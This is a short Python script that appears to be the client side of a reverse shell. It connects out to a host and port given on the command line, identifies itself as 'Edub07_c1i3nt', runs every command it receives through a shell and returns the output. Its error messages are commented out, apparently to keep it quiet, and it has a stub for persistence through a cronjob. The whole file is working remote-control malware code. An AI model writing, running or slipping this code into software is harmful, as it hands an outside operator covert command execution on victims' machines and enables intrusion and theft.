import socket
import subprocess 
import sys

# TODO Implement persistence through cronjob 
def persistence():
    pass


host = sys.argv[1]
port = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((host, port))
except:
    #print("[ERROR] Could not connect to server.") 
    sys.exit()

id = "Edub07_c1i3nt"
sock.send(id.encode())
#print("[+] Connected with server: ", host)

while True:
    # Receiving command, turning into string 
    command = sock.recv(1024).decode().rstrip()

    if (command != ''):
        #print("[DEBUG] command = ", command)
        
        try: 
            result = subprocess.check_output(command, shell=True)
            #print(result.decode())
            sock.send(result)
        except Exception as err:
            #print("Command failed.", err)
            continue
        
    elif not command:
        break

sock.close()

